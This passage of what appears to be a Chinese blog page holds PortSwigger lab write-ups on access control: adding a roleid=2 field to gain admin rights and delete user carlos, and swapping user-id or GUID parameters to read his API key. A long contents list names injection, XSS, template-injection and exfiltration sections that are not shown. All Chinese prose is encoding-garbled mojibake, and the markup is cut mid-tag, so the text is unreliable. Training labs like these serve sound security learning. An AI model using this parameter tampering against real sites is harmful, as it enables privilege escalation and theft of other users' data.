href="#user-role-can-be-modified-in-user-profile"><span>User role can be modified in user profile</span></a></h2><blockquote><p>è¿™ä¸ªå®éªŒå®¤æœ‰ä¸€ä¸ªä½äº/adminçš„ç®¡ç†é¢æ¿ã€‚åªæœ‰è§’è‰²IDä¸º2çš„ç™»å½•ç”¨æˆ·æ‰èƒ½è®¿é—®å®ƒã€‚ é€šè¿‡è®¿é—®ç®¡ç†é¢æ¿å¹¶ä½¿ç”¨å®ƒåˆ é™¤ç”¨æˆ·carlosæ¥è§£å†³å®éªŒå®¤é—®é¢˜ã€‚ æ‚¨å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‡­æ®ç™»å½•åˆ°è‡ªå·±çš„å¸æˆ·ï¼šwiener:peter</p></blockquote><p>ç™»å½•è´¦æˆ·ï¼ŒæŠ“å–æ›´æ–°é‚®ç®±çš„æ•°æ®åŒ…ï¼ŒæŸ¥çœ‹responseå‘ç°ä¸€ä¸ªroleid</p><p><img src="/sake-s-blog/assets/image-20230121233836789-ngmQGQ1C.png" alt="image-20230121233836789"></p><p>äºæ˜¯æˆ‘ä»¬å°è¯•åœ¨è¯·æ±‚æ—¶æ·»åŠ è¿™ä¸ªå­—æ®µï¼Œä¼ å…¥çš„å‚æ•°å€¼ä¸º2ï¼ŒæˆåŠŸè¶Šæƒ</p><p><img src="/sake-s-blog/assets/image-20230121233940849-CIQWngHL.png" alt="image-20230121233940849"></p><p>è®¿é—®/adminï¼Œåˆ é™¤ç”¨æˆ·carlos</p><p><img src="/sake-s-blog/assets/image-20230121234031120-BEFrgaou.png" alt="image-20230121234031120"></p><h2 id="user-id-controlled-by-request-parameter" tabindex="-1"><a class="header-anchor" href="#user-id-controlled-by-request-parameter"><span>User ID controlled by request parameter</span></a></h2><blockquote><p>æ­¤å®éªŒå®¤åœ¨ç”¨æˆ·å¸æˆ·é¡µé¢ä¸Šå­˜åœ¨æ¨ªå‘æƒé™æå‡æ¼æ´ã€‚ è¦è§£å†³å®éªŒå®¤é—®é¢˜ï¼Œè¯·è·å–ç”¨æˆ·carlosçš„APIå¯†é’¥å¹¶å°†å…¶ä½œä¸ºè§£å†³æ–¹æ¡ˆæäº¤ã€‚ æ‚¨å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‡­æ®ç™»å½•åˆ°è‡ªå·±çš„å¸æˆ·ï¼šwiener:peter</p></blockquote><p>æŠ“å–ç‚¹å‡»<strong>My account</strong>è¯·æ±‚çš„æ•°æ®åŒ…ï¼Œå‘ç°è¯·æ±‚çš„å‚æ•°å«æœ‰wienerï¼Œæˆ‘ä»¬å°†å…¶æ”¹ä¸ºcarlosä¾¿å¯ä»¥ä¼ªé€ ç™»å½•</p><p><img src="/sake-s-blog/assets/image-20230121234502121-BVJ7wC6j.png" alt="image-20230121234502121"></p><p><img src="/sake-s-blog/assets/image-20230121234537455-Drm78jJt.png" alt="image-20230121234537455"></p><h2 id="user-id-controlled-by-request-parameter-with-unpredictable-user-ids" tabindex="-1"><a class="header-anchor" href="#user-id-controlled-by-request-parameter-with-unpredictable-user-ids"><span>User ID controlled by request parameter, with unpredictable user IDs</span></a></h2><blockquote><p>æ­¤å®éªŒå®¤åœ¨ç”¨æˆ·å¸æˆ·é¡µé¢ä¸Šå­˜åœ¨æ¨ªå‘æƒé™æå‡æ¼æ´ï¼Œä½†ä½¿ç”¨GUIDæ ‡è¯†ç”¨æˆ·ã€‚ è¦è§£å†³å®éªŒå®¤é—®é¢˜ï¼Œè¯·æ‰¾åˆ°carlosçš„GUIDï¼Œç„¶åæäº¤ä»–çš„APIå¯†é’¥ä½œä¸ºè§£å†³æ–¹æ¡ˆã€‚ æ‚¨å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‡­æ®ç™»å½•åˆ°è‡ªå·±çš„å¸æˆ·ï¼šwiener:peter</p></blockquote><p>ç™»å½•ç”¨æˆ·ï¼ŒæŠ“å–ç™»å½•çš„æ•°æ®åŒ…ï¼Œå¯ä»¥å‘ç°è¯·æ±‚äº†<code>id=e6b5074a-501e-4b08-8d69-1e8dbb2af207</code>ï¼Œè¿™ä¸€æ®µidæ˜¯ä»£è¡¨æˆ‘ä»¬çš„ç”¨æˆ·id</p><p><img src="/sake-s-blog/assets/image-20230204171127553-Bbf2eYmx.png" alt="image-20230204171127553"></p><p>æ¥ä¸‹æ¥æˆ‘ä»¬æ‰¾åˆ°carlosçš„æ–‡ç« ï¼Œè·å–åˆ°<code>id=af9a8df9-9e0d-4b4d-aba4-d58c4115281b</code></p><p><img src="/sake-s-blog/assets/image-20230204171216075-CX0euws8.png" alt="image-20230204171216075"></p><p><img src="/sake-s-blog/assets/image-20230204171318084-NHFmmskc.png" alt="image-20230204171318084"></p></div></div><footer class="page-meta"><div class="meta-item edit-link"><span class="xicon-container left meta-item-label"><!--[--><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 32 32" class="xicon-icon" style="width:20px;height:20px;font-size:20px;color:inherit;"><path d="M2 26h28v2H2z" fill="currentColor"></path><path d="M25.4 9c.8-.8.8-2 0-2.8l-3.6-3.6c-.8-.8-2-.8-2.8 0l-15 15V24h6.4l15-15zm-5-5L24 7.6l-3 3L17.4 7l3-3zM6 22v-3.6l10-10l3.6 3.6l-10 10H6z" fill="currentColor"></path></svg><!--]--><span class="xicon-content" style="color:inherit;font-size:14px;"><!--[-->Edit this page<!--]--></span></span></div><div class="meta-item last-updated"><span class="xicon-container left meta-item-label"><!--[--><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 32 32" class="xicon-icon" style="width:20px;height:20px;font-size:20px;color:inherit;"><path d="M26 4h-4V2h-2v2h-8V2h-2v2H6c-1.1 0-2 .9-2 2v20c0 1.1.9 2 2 2h20c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm0 22H6V12h20v14zm0-16H6V6h4v2h2V6h8v2h2V6h4v4z" fill="currentColor"></path></svg><!--]--><span class="xicon-content" style="color:inherit;font-size:14px;"><!--[-->Last Updated 2024/8/11 04:00:17<!--]--></span></span></div></footer><!----><!----></div><div class="page-catalog-container"><h5 class="tip">ON THIS PAGE</h5><ul><!--[--><!--[--><li class="page-catalog-menu-depth_2"><a aria-current="page" href="/sake-s-blog/blogs/jishu/PortSwigger-Writeup.html#whereå­å¥ä¸­çš„sqlæ³¨å…¥æ¼æ´å…è®¸æ£€ç´¢éšè—æ•°æ®" class="router-link-active router-link-exact-active link page-catalog-item page-catalog-item" aria-label="WHEREå­å¥ä¸­çš„SQLæ³¨å…¥æ¼æ´å…è®¸æ£€ç´¢éšè—æ•°æ®"><!--[--><!--]--><span class="xicon-container left"><!--[--><!----><!--]--><span class="xicon-content" style="color:inherit;font-size:14px;"><!--[-->WHEREå­å¥ä¸­çš„SQLæ³¨å…¥æ¼æ´å…è®¸æ£€ç´¢éšè—æ•°æ®<!--]--></span></span><!--[--><!--]--></a></li><!--]--><!--[--><li class="page-catalog-menu-depth_2"><a aria-current="page" href="/sake-s-blog/blogs/jishu/PortSwigger-Writeup.html#å…è®¸ç»•è¿‡ç™»å½•çš„sqlæ³¨å…¥æ¼æ´" class="router-link-active router-link-exact-active link page-catalog-item page-catalog-item" aria-label="å…è®¸ç»•è¿‡ç™»å½•çš„SQLæ³¨å…¥æ¼æ´"><!--[--><!--]--><span class="xicon-container left"><!--[--><!----><!--]--><span class="xicon-content" style="color:inherit;font-size:14px;"><!--[-->å…è®¸ç»•è¿‡ç™»å½•çš„SQLæ³¨å…¥æ¼æ´<!--]--></span></span><!--[--><!--]--></a></li><!--]--><!--[--><li class="page-catalog-menu-depth_2"><a aria-current="page" href="/sake-s-blog/blogs/jishu/PortSwigger-Writeup.html#unionæ”»å‡»æŸ¥è¯¢è¿”å›çš„åˆ—æ•°" class="router-link-active router-link-exact-active link page-catalog-item page-catalog-item" aria-label="UNIONæ”»å‡»æŸ¥è¯¢è¿”å›çš„åˆ—æ•°"><!--[--><!--]--><span class="xicon-container left"><!--[--><!----><!--]--><span class="xicon-content" style="color:inherit;font-size:14px;"><!--[-->UNIONæ”»å‡»æŸ¥è¯¢è¿”å›çš„åˆ—æ•°<!--]--></span></span><!--[--><!--]--></a></li><!--]--><!--[--><li class="page-catalog-menu-depth_2"><a aria-current="page" href="/sake-s-blog/blogs/jishu/PortSwigger-Writeup.html#unionæ”»å‡»æŸ¥æ‰¾åŒ…å«æ–‡æœ¬çš„åˆ—" class="router-link-active router-link-exact-active link page-catalog-item page-catalog-item" aria-label="UNIONæ”»å‡»æŸ¥æ‰¾åŒ…å«æ–‡æœ¬çš„åˆ—"><!--[--><!--]--><span class="xicon-container left"><!--[--><!----><!--]--><span class="xicon-content" style="color:inherit;font-size:14px;"><!--[-->UNIONæ”»å‡»æŸ¥æ‰¾åŒ…å«æ–‡æœ¬çš„åˆ—<!--]--></span></span><!--[--><!--]--></a></li><!--]--><!--[--><li class="page-catalog-menu-depth_2"><a aria-current="page" href="/sake-s-blog/blogs/jishu/PortSwigger-Writeup.html#unionæ”»å‡»ä»å…¶ä»–è¡¨ä¸­æ£€ç´¢æ•°æ®" class="router-link-active router-link-exact-active link page-catalog-item page-catalog-item" aria-label="UNIONæ”»å‡»ä»å…¶ä»–è¡¨ä¸­æ£€ç´¢æ•°æ®"><!--[--><!--]--><span class="xicon-container left"><!--[--><!----><!--]--><span class="xicon-content" style="color:inherit;font-size:14px;"><!--[-->UNIONæ”»å‡»ä»å…¶ä»–è¡¨ä¸­æ£€ç´¢æ•°æ®<!--]--></span></span><!--[--><!--]--></a></li><!--]--><!--[--><li class="page-catalog-menu-depth_2"><a aria-current="page" href="/sake-s-blog/blogs/jishu/PortSwigger-Writeup.html#union-æ”»å‡»åœ¨å•ä¸ªåˆ—ä¸­æ£€ç´¢å¤šä¸ªå€¼" class="router-link-active router-link-exact-active link page-catalog-item page-catalog-item" aria-label="UNION æ”»å‡»åœ¨å•ä¸ªåˆ—ä¸­æ£€ç´¢å¤šä¸ªå€¼"><!--[--><!--]--><span class="xicon-container left"><!--[--><!----><!--]--><span class="xicon-content" style="color:inherit;font-size:14px;"><!--[-->UNION æ”»å‡»åœ¨å•ä¸ªåˆ—ä¸­æ£€ç´¢å¤šä¸ªå€¼<!--]--></span></span><!--[--><!--]--></a></li><!--]--><!--[--><li class="page-catalog-menu-depth_2"><a aria-current="page" href="/sake-s-blog/blogs/jishu/PortSwigger-Writeup.html#æŸ¥è¯¢oracleä¸Šçš„æ•°æ®åº“ç±»å‹å’Œç‰ˆæœ¬" class="router-link-active router-link-exact-active link page-catalog-item page-catalog-item" aria-label="æŸ¥è¯¢Oracleä¸Šçš„æ•°æ®åº“ç±»å‹å’Œç‰ˆæœ¬"><!--[--><!--]--><span class="xicon-container left"><!--[--><!----><!--]--><span class="xicon-content" style="color:inherit;font-size:14px;"><!--[-->æŸ¥è¯¢Oracleä¸Šçš„æ•°æ®åº“ç±»å‹å’Œç‰ˆæœ¬<!--]--></span></span><!--[--><!--]--></a></li><!--]--><!--[--><li class="page-catalog-menu-depth_2"><a aria-current="page" href="/sake-s-blog/blogs/jishu/PortSwigger-Writeup.html#æŸ¥è¯¢mysqlå’Œå¾®è½¯ä¸Šçš„æ•°æ®åº“ç±»å‹å’Œç‰ˆæœ¬" class="router-link-active router-link-exact-active link page-catalog-item page-catalog-item" aria-label="æŸ¥è¯¢MySQLå’Œå¾®è½¯ä¸Šçš„æ•°æ®åº“ç±»å‹å’Œç‰ˆæœ¬"><!--[--><!--]--><span class="xicon-container left"><!--[--><!----><!--]--><span class="xicon-content" style="color:inherit;font-size:14px;"><!--[-->æŸ¥è¯¢MySQLå’Œå¾®è½¯ä¸Šçš„æ•°æ®åº“ç±»å‹å’Œç‰ˆæœ¬<!--]--></span></span><!--[--><!--]--></a></li><!--]--><!--[--><li class="page-catalog-menu-depth_2"><a aria-current="page" href="/sake-s-blog/blogs/jishu/PortSwigger-Writeup.html#åˆ—å‡ºé-oracle-æ•°æ®åº“ä¸Šçš„æ•°æ®åº“å†…å®¹" class="router-link-active router-link-exact-active link page-catalog-item page-catalog-item" aria-label="åˆ—å‡ºé Oracle æ•°æ®åº“ä¸Šçš„æ•°æ®åº“å†…å®¹"><!--[--><!--]--><span class="xicon-container left"><!--[--><!----><!--]--><span class="xicon-content" style="color:inherit;font-size:14px;"><!--[-->åˆ—å‡ºé Oracle æ•°æ®åº“ä¸Šçš„æ•°æ®åº“å†…å®¹<!--]--></span></span><!--[--><!--]--></a></li><!--]--><!--[--><li class="page-catalog-menu-depth_2"><a aria-current="page" href="/sake-s-blog/blogs/jishu/PortSwigger-Writeup.html#åˆ—å‡ºoracleä¸Šçš„æ•°æ®åº“å†…å®¹" class="router-link-active router-link-exact-active link page-catalog-item page-catalog-item" aria-label="åˆ—å‡ºOracleä¸Šçš„æ•°æ®åº“å†…å®¹"><!--[--><!--]--><span class="xicon-container left"><!--[--><!----><!--]--><span class="xicon-content" style="color:inherit;font-size:14px;"><!--[-->åˆ—å‡ºOracleä¸Šçš„æ•°æ®åº“å†…å®¹<!--]--></span></span><!--[--><!--]--></a></li><!--]--><!--[--><li class="page-catalog-menu-depth_2"><a aria-current="page" href="/sake-s-blog/blogs/jishu/PortSwigger-Writeup.html#å¸¦æœ‰æ¡ä»¶å“åº”çš„sqlç›²æ³¨" class="router-link-active router-link-exact-active link page-catalog-item page-catalog-item" aria-label="å¸¦æœ‰æ¡ä»¶å“åº”çš„SQLç›²æ³¨"><!--[--><!--]--><span class="xicon-container left"><!--[--><!----><!--]--><span class="xicon-content" style="color:inherit;font-size:14px;"><!--[-->å¸¦æœ‰æ¡ä»¶å“åº”çš„SQLç›²æ³¨<!--]--></span></span><!--[--><!--]--></a></li><!--]--><!--[--><li class="page-catalog-menu-depth_2"><a aria-current="page" href="/sake-s-blog/blogs/jishu/PortSwigger-Writeup.html#å¸¦æœ‰æ¡ä»¶é”™è¯¯çš„sqlç›²æ³¨" class="router-link-active router-link-exact-active link page-catalog-item page-catalog-item" aria-label="å¸¦æœ‰æ¡ä»¶é”™è¯¯çš„SQLç›²æ³¨"><!--[--><!--]--><span class="xicon-container left"><!--[--><!----><!--]--><span class="xicon-content" style="color:inherit;font-size:14px;"><!--[-->å¸¦æœ‰æ¡ä»¶é”™è¯¯çš„SQLç›²æ³¨<!--]--></span></span><!--[--><!--]--></a></li><!--]--><!--[--><li class="page-catalog-menu-depth_2"><a aria-current="page" href="/sake-s-blog/blogs/jishu/PortSwigger-Writeup.html#å¸¦æœ‰æ—¶é—´å»¶æ—¶çš„sqlæ³¨å…¥" class="router-link-active router-link-exact-active link page-catalog-item page-catalog-item" aria-label="å¸¦æœ‰æ—¶é—´å»¶æ—¶çš„SQLæ³¨å…¥"><!--[--><!--]--><span class="xicon-container left"><!--[--><!----><!--]--><span class="xicon-content" style="color:inherit;font-size:14px;"><!--[-->å¸¦æœ‰æ—¶é—´å»¶æ—¶çš„SQLæ³¨å…¥<!--]--></span></span><!--[--><!--]--></a></li><!--]--><!--[--><li class="page-catalog-menu-depth_2"><a aria-current="page" href="/sake-s-blog/blogs/jishu/PortSwigger-Writeup.html#å¸¦æœ‰æ—¶é—´å»¶è¿Ÿå’Œä¿¡æ¯æ£€ç´¢çš„sqlç›²æ³¨" class="router-link-active router-link-exact-active link page-catalog-item page-catalog-item" aria-label="å¸¦æœ‰æ—¶é—´å»¶è¿Ÿå’Œä¿¡æ¯æ£€ç´¢çš„SQLç›²æ³¨"><!--[--><!--]--><span class="xicon-container left"><!--[--><!----><!--]--><span class="xicon-content" style="color:inherit;font-size:14px;"><!--[-->å¸¦æœ‰æ—¶é—´å»¶è¿Ÿå’Œä¿¡æ¯æ£€ç´¢çš„SQLç›²æ³¨<!--]--></span></span><!--[--><!--]--></a></li><!--]--><!--[--><li class="page-catalog-menu-depth_2"><a aria-current="page" href="/sake-s-blog/blogs/jishu/PortSwigger-Writeup.html#oobç›²æ³¨" class="router-link-active router-link-exact-active link page-catalog-item page-catalog-item" aria-label="OOBç›²æ³¨"><!--[--><!--]--><span class="xicon-container left"><!--[--><!----><!--]--><span class="xicon-content" style="color:inherit;font-size:14px;"><!--[-->OOBç›²æ³¨<!--]--></span></span><!--[--><!--]--></a></li><!--]--><!--[--><li class="page-catalog-menu-depth_2"><a aria-current="page" href="/sake-s-blog/blogs/jishu/PortSwigger-Writeup.html#" class="router-link-active router-link-exact-active link page-catalog-item page-catalog-item" aria-label="------------------------------"><!--[--><!--]--><span class="xicon-container left"><!--[--><!----><!--]--><span class="xicon-content" style="color:inherit;font-size:14px;"><!--[-->------------------------------<!--]--></span></span><!--[--><!--]--></a></li><!--]--><!--[--><li class="page-catalog-menu-depth_2"><a aria-current="page" href="/sake-s-blog/blogs/jishu/PortSwigger-Writeup.html#æ— ç¼–ç åå°„å‹xss" class="router-link-active router-link-exact-active link page-catalog-item page-catalog-item" aria-label="æ— ç¼–ç åå°„å‹XSS"><!--[--><!--]--><span class="xicon-container left"><!--[--><!----><!--]--><span class="xicon-content" style="color:inherit;font-size:14px;"><!--[-->æ— ç¼–ç åå°„å‹XSS<!--]--></span></span><!--[--><!--]--></a></li><!--]--><!--[--><li class="page-catalog-menu-depth_2"><a aria-current="page" href="/sake-s-blog/blogs/jishu/PortSwigger-Writeup.html#-1" class="router-link-active router-link-exact-active link page-catalog-item page-catalog-item" aria-label="------------------------------"><!--[--><!--]--><span class="xicon-container left"><!--[--><!----><!--]--><span class="xicon-content" style="color:inherit;font-size:14px;"><!--[-->------------------------------<!--]--></span></span><!--[--><!--]--></a></li><!--]--><!--[--><li class="page-catalog-menu-depth_2"><a aria-current="page" href="/sake-s-blog/blogs/jishu/PortSwigger-Writeup.html#basic-server-side-template-injection" class="router-link-active router-link-exact-active link page-catalog-item page-catalog-item" aria-label="Basic server-side template injection"><!--[--><!--]--><span class="xicon-container left"><!--[--><!----><!--]--><span class="xicon-content" style="color:inherit;font-size:14px;"><!--[-->Basic server-side template injection<!--]--></span></span><!--[--><!--]--></a></li><!--]--><!--[--><li class="page-catalog-menu-depth_2"><a aria-current="page" href="/sake-s-blog/blogs/jishu/PortSwigger-Writeup.html#basic-server-side-template-injection-code-context" class="router-link-active router-link-exact-active link page-catalog-item page-catalog-item" aria-label="Basic server-side template injection (code context)"><!--[--><!--]--><span class="xicon-container left"><!--[--><!----><!--]--><span class="xicon-content" style="color:inherit;font-size:14px;"><!--[-->Basic server-side template injection (code context)<!--]--></span></span><!--[--><!--]--></a></li><!--]--><!--[--><li class="page-catalog-menu-depth_2"><a aria-current="page" href="/sake-s-blog/blogs/jishu/PortSwigger-Writeup.html#server-side-template-injection-using-documentation" class="router-link-active router-link-exact-active link page-catalog-item page-catalog-item" aria-label="Server-side template injection using documentation"><!--[--><!--]--><span class="xicon-container left"><!--[--><!----><!--]--><span class="xicon-content" style="color:inherit;font-size:14px;"><!--[-->Server-side template injection using documentation<!--]--></span></span><!--[--><!--]--></a></li><!--]--><!--[--><li class="page-catalog-menu-depth_2"><a aria-current="page" href="/sake-s-blog/blogs/jishu/PortSwigger-Writeup.html#server-side-template-injection-in-an-unknown-language-with-a-documented-exploit" class="router-link-active router-link-exact-active link page-catalog-item page-catalog-item" aria-label="Server-side template injection in an unknown language with a documented exploit"><!--[--><!--]--><span class="xicon-container left"><!--[--><!----><!--]--><span class="xicon-content" style="color:inherit;font-size:14px;"><!--[-->Server-side template injection in an unknown language with a documented exploit<!--]--></span></span><!--[--><!--]--></a></li><!--]--><!--[--><li class="page-catalog-menu-depth_2"><a aria-current="page" href="/sake-s-blog/blogs/jishu/PortSwigger-Writeup.html#server-side-template-injection-with-information-disclosure-via-user-supplied-objects" class="router-link-active router-link-exact-active link page-catalog-item page-catalog-item" aria-label="Server-side template injection with information disclosure via user-supplied objects"><!--[--><!--]--><span class="xicon-container left"><!--[--><!----><!--]--><span class="xicon-content" style="color:inherit;font-size:14px;"><!--[-->Server-side template injection with information disclosure via user-supplied objects<!--]--></span></span><!--[--><!--]--></a></li><!--]--><!--[--><li class="page-catalog-menu-depth_2"><a aria-current="page" href="/sake-s-blog/blogs/jishu/PortSwigger-Writeup.html#-2" class="router-link-active router-link-exact-active link page-catalog-item page-catalog-item" aria-label="------------------------------"><!--[--><!--]--><span class="xicon-container left"><!--[--><!----><!--]--><span class="xicon-content" style="color:inherit;font-size:14px;"><!--[-->------------------------------<!--]--></span></span><!--[--><!--]--></a></li><!--]--><!--[--><li class="page-catalog-menu-depth_2"><a aria-current="page" href="/sake-s-blog/blogs/jishu/PortSwigger-Writeup.html#ç®€å•æ¡ˆä¾‹1" class="router-link-active router-link-exact-active link page-catalog-item page-catalog-item" aria-label="ç®€å•æ¡ˆä¾‹1"><!--[--><!--]--><span class="xicon-container left"><!--[--><!----><!--]--><span class="xicon-content" style="color:inherit;font-size:14px;"><!--[-->ç®€å•æ¡ˆä¾‹1<!--]--></span></span><!--[--><!--]--></a></li><!--]--><!--[--><li class="page-catalog-menu-depth_2"><a aria-current="page" href="/sake-s-blog/blogs/jishu/PortSwigger-Writeup.html#åŸºäºæ—¶é—´çš„å‘½ä»¤ç›²æ³¨" class="router-link-active router-link-exact-active link page-catalog-item page-catalog-item" aria-label="åŸºäºæ—¶é—´çš„å‘½ä»¤ç›²æ³¨"><!--[--><!--]--><span class="xicon-container left"><!--[--><!----><!--]--><span class="xicon-content" style="color:inherit;font-size:14px;"><!--[-->åŸºäºæ—¶é—´çš„å‘½ä»¤ç›²æ³¨<!--]--></span></span><!--[--><!--]--></a></li><!--]--><!--[--><li class="page-catalog-menu-depth_2"><a aria-current="page" href="/sake-s-blog/blogs/jishu/PortSwigger-Writeup.html#å‘½ä»¤æ³¨å…¥ä¸è¾“å‡ºé‡å®šå‘" class="router-link-active router-link-exact-active link page-catalog-item page-catalog-item" aria-label="å‘½ä»¤æ³¨å…¥ä¸è¾“å‡ºé‡å®šå‘"><!--[--><!--]--><span class="xicon-container left"><!--[--><!----><!--]--><span class="xicon-content" style="color:inherit;font-size:14px;"><!--[-->å‘½ä»¤æ³¨å…¥ä¸è¾“å‡ºé‡å®šå‘<!--]--></span></span><!--[--><!--]--></a></li><!--]--><!--[--><li class="page-catalog-menu-depth_2"><a aria-current="page" href="/sake-s-blog/blogs/jishu/PortSwigger-Writeup.html#å‘½ä»¤æ³¨å…¥ä¸oob" class="router-link-active router-link-exact-active link page-catalog-item page-catalog-item" aria-label="å‘½ä»¤æ³¨å…¥ä¸OOB"><!--[--><!--]--><span class="xicon-container left"><!--[--><!----><!--]--><span class="xicon-content" style="color:inherit;font-size:14px;"><!--[-->å‘½ä»¤æ³¨å…¥ä¸OOB<!--]--></span></span><!--[--><!--]--></a></li><!--]--><!--[--><li class="page-catalog-menu-depth_2"><a aria-current="page" href="/sake-s-blog/blogs/jishu/PortSwigger-Writeup.html#å‘½ä»¤æ³¨å…¥ä¸å¸¦å¤–æ•°æ®æ³„éœ²" class="router-link-active router-link-exact-active link page-catalog-item page-catalog-item" aria-label="å‘½ä»¤æ³¨å…¥ä¸å¸¦å¤–æ•°æ®æ³„éœ²"><!--[--><!--]--><span class="xicon-container left"><!--[--><!----><!--]--><span class="xicon-content" style="color:inherit;font-size:14px;"><!--[-->å‘½ä»¤æ³¨å…¥ä¸å¸¦å¤–æ•°æ®æ³„éœ²<!--]--></span></span><!--[--><!--]--></a></li><!--]--><!--[--><li class="page-catalog-menu-depth_2"><a aria-current="page" href="/sake-s-blog/blogs/jishu/PortSwigger-Writeup.html#-3" class="router-link-active router-link-exact-active link page-catalog-item page-catalog-item" aria-label="------------------------------"><!--[--><!--]--><span class="xicon-container left"><!--[--><!----><!--]--><span class="xicon-content" style="color:inherit;font-size:14px;"><!--[-->------------------------------<!--]--></span></span><!--[--><!--]--></a></li><!--]--><!--[--><li class="page-catalog-menu-depth_2"><a aria-current="page" href="/sake-s-blog/blogs/jishu/PortSwigger-Writeup.html#ç®€å•æ¡ˆä¾‹1-1" class="router-link-active router-link-exact-active link page-catalog-item page-catalog-item" aria-label="ç®€å•æ¡ˆä¾‹1"><!--[--><!--]--><span class="xicon-container left"><!--[--><!----><!--]--><span class="xicon-content" style="color:inherit;font-size:14px;"><!--[-->ç®€å•æ¡ˆä¾‹1<!--]--></span></span><!--[--><!--]--></a></li><!--]--><!--[--><li class="page-catalog-menu-depth_2"><a aria-current="page" href="/sake-s-blog/blogs/jishu/PortSwigger-Writeup.html#ç®€å•æ¡ˆä¾‹2" class="router-link-active router-link-exact-active link page-catalog-item page-catalog-item" aria-label="ç®€å•æ¡ˆä¾‹2"><!--[--><!--]--><span class="xicon-container left"><!--[--><!----><!--]--><span class="xicon-content" style="color:inherit;font-size:14px;"><!--[-->ç®€å•æ¡ˆä¾‹2<!--]--></span></span><!--[--><!--]--></a></li><!--]--><!--[--><li class="page-catalog-menu-depth_2"><a aria-current="page" href="/sake-s-blog/blogs/jishu/PortSwigger-Writeup.html#ç®€å•æ¡ˆä¾‹3" class="router-link-active router-link-exact-active link page-catalog-item page-catalog-item" aria-label="ç®€å•æ¡ˆä¾‹3"><!--[--><!--]--><span class="xicon-container left"><!--[--><!----><!--]--><span class="xicon-content" style="color:inherit;font-size:14px;"><!--[-->ç®€å•æ¡ˆä¾‹3<!--]--></span></span><!--[--><!--]--></a></li><!--]--><!--[--><li class="page-catalog-menu-depth_2"><a aria-current="page" href="/sake-s-blog/blogs/jishu/PortSwigger-Writeup.html#ç®€å•æ¡ˆä¾‹4" class="router-link-active router-link-exact-active link page-catalog-item page-catalog-item" aria-label="ç®€å•æ¡ˆä¾‹4"><!--[--><!--]--><span class="xicon-container left"><!--[--><!----><!--]--><span class="xicon-content" style="color:inherit;font-size:14px;"><!--[-->ç®€å•æ¡ˆä¾‹4<!--]--></span></span><!--[--><!--]--></a></li><!--]--><!--[--><li class="page-catalog-menu-depth_2"><a aria-current="page" href="/sake-s-blog/blogs/jishu/PortSwigger-Writeup.html#ç®€å•æ¡ˆä¾‹5" class="router-link-active router-link-exact-active link page-catalog-item page-catalog-item" aria-label="ç®€å•æ¡ˆä¾‹5"><!--[--><!--]--><span class="xicon-container left"><!--[--><!----><!--]--><span class="xicon-content" style="color:inherit;font-size:14px;"><!--[-->ç®€å•æ¡ˆä¾‹5<!--]--></span></span><!--[--><!--]--></a></li><!--]--><!--[--><li class="page-catalog-menu-depth_2"><a aria-current="page" href="/sake-s-blog/blogs/jishu/PortSwigger-Writeup.html#ç®€å•æ¡ˆä¾‹6" class="router-link-active router-link-exact-active link page-catalog-item page-catalog-item" aria-label="ç®€å•æ¡ˆä¾‹6"><!--[--><!--]--><span class="xicon-container left"><!--[--><!----><!--]--><span class="xicon-content" style="color:inherit;font-size:14px;"><!--[-->ç®€å•æ¡ˆä¾‹6<!--]--></span></span><!--[--><!--]--></a></li><!--]--><!--[--><li class="page-catalog-menu-depth_2"><a aria-current="page" href="/sake-s-blog/blogs/jishu/PortSwigger-Writeup.html#-4" class="router-link-active router-link-exact-active link page-catalog-item page-catalog-item" aria-label="------------------------------"><!--[--><!--]--><span class="xicon-container left"><!--[--><!----><!--]--><span class="xicon-content" style="color:inherit;font-size:14px;"><!--[-->------------------------------<!--]--></span></span><!--[--><!--]--></a></li><!--]--><!--[--><li class="page-catalog-menu-depth_2"><a aria-current="page" href="/sake-s-blog/blogs/jishu/PortSwigger-Writeup.html#cors-vulnerability-with-basic-origin-reflection" class="router-link-active router-link-exact-active link page-catalog-item page-catalog-item" aria-label="CORS vulnerability with basic origin reflection"><!--[--><!--]--><span class="xicon-container left"><!--[--><!----><!--]--><span class="xicon-content" style="color:inherit;font-size:14px;"><!--[-->CORS vulnerability with basic origin reflection<!--]--></span></span><!--[--><!--]--></a></li><!--]--><!--[--><li class="page-catalog-menu-depth_2"><a aria-current="page" href="/sake-s-blog/blogs/jishu/PortSwigger-Writeup.html#-5" class="router-link-active router-link-exact-active link page-catalog-item page-catalog-item" aria-label="------------------------------"><!--[--><!--]--><span class="xicon-container left"><!--[--><!----><!--]--><span class="xicon-content" style="color:inherit;font-size:14px;"><!--[-->------------------------------<!--]--></span></span><!--[--><!--]--></a></li><!--]--><!--[--><li class="page-catalog-menu-depth_2"><a aria-current="page" href="/sake-s-blog/blogs/jishu/PortSwigger-Writeup.html#username-enumeration-via-different-responses" class="router-link-active router-link-exact-active link page-catalog-item page-catalog-item" aria-label="Username enumeration via different responses"><!--[--><!--]--><span class="xicon-container left"><!--[--><!----><!--]--><span class="xicon-content" style="color:inherit;font-size:14px;"><!--[-->Username enumeration via different responses<!--]--></span></span><!--[--><!--]--></a></li><!--]--><!--[--><li class="page-catalog-menu-depth_2"><a aria-current="page" href="/sake-s-blog/blogs/jishu/PortSwigger-Writeup.html#_2fa-simple-bypass" class="router-link-active router-link-exact-active link page-catalog-item page-catalog-item" aria-label="2FA simple bypass"><!--[--><!--]--><span class="xicon-container left"><!--[--><!----><!--]--><span class="xicon-content" style="color:inherit;font-size:14px;"><!--[-->2FA simple bypass<!--]--></span></span><!--[--><!--]--></a></li><!--]--><!--[--><li class="page-catalog-menu-depth_2"><a aria-current="page" href="/sake-s-blog/blogs/jishu/PortSwigger-Writeup.html#password-reset-broken-logic" class="router-link-active router-link-exact-active link page-catalog-item page-catalog-item" aria-label="Password reset broken logic"><!--[--><!--]--><span class="xicon-container left"><!--[--><!----><!--]--><span class="xicon-content" style="color:inherit;font-size:14px;"><!--[-->Password reset broken logic<!--]--></span></span><!--[--><!--]--></a></li><!--]--><!--[--><li class="page-catalog-menu-depth_2"><a aria-current="page" href="/sake-s-blog/blogs/jishu/PortSwigger-Writeup.html#username-enumeration-via-subtly-different-responses" class="router-link-active router-link-exact-active link page-catalog-item 